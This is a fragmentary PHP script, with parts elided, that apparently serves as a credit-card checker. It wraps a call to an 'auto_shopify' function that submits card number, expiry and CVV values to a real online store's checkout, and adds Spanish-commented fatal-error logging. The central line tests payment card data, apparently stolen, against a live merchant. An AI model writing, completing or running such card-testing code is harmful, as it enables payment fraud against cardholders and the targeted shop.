...
$gateway,
 ...
 function handleFatalError() {
    ...
    if ($error !== NULL && $error['type'] === E_ERROR) {
        // Captura el error fatal y guárdalo en un archivo de texto
        $errorMessage = "Fatal error: " . $error['message'] . "\n";
        file_put_contents("fatal_error_log.txt", $errorMessage, FILE_APPEND);
    }
}

// Registrar el manejador de errores para capturar errores fatales
register_shutdown_function('handleFatalError');
 try{
 $me = (auto_shopify('https://americanblingcare.com',"$cc|$mes|$ano|$cvv"));
 } catch (Exception $e) {
    // Si hay algún error dentro del try, capturarlo y guardarlo
...
if(!$errormessage){
    $errormessage = "Error request loading";
